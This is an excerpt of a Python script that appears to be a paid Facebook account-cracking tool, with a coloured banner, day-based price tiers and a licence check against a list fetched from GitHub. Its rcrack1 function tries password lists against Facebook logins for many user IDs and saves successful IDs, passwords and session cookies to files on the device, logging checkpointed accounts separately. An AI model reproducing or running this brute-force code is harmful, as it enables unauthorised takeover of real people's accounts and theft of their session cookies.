...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mAF ARIF JIHADI  SR
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mAF ARIF JIHADI  SR
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46m7dey1800/15day3500/30day5000
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
            # os.system('xdg-openhttps://www.facebook.com/profile.php?id=100092175009034')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sAF ARIF JIHADI \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[AF ARIF JIHADI -OK] {uid}|{ps}")
                open('/sdcard/AF ARIF JIHADI -OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[AF ARIF JIHADI -CP💔] {uid}|{ps}")
                open('/sdcard/AF ARIF JIHADI -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def shoha_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Rdx337/AF ARIF JIHADI opi/blob/main/Ap.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100092175009034")
        time.sleep(3.0)
        ...
        os.system("xdg-open :https://wa.me/8801945370359")
        shoha_menu()   
shoha_menu()
